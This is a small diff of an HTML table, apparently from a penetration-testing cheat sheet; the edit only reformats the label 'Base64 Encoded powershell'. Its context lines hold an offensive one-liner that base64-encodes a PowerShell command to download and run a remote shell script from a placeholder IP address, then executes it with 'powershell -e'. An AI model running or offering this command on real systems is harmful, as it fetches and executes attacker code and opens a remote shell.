@@ -159,9 +159,7 @@ systemctl start &lt;service&gt;
             </td>
         </tr>
         <tr>
-            <td>
-                <li>Base64 Encoded powershell</li>
-            </td>
+            <td>Base64 Encoded powershell</td>
             <td>
                 <li>echo &quot;IEX(IWR http://&lt;ip address&gt;/shell.ps1 -UseBasicParsing)&quot; | iconv -t utf-16le | base64 -w 0</li>
                 <li>powershell -e &lt;Base64 Encoded Shell&gt;</li>
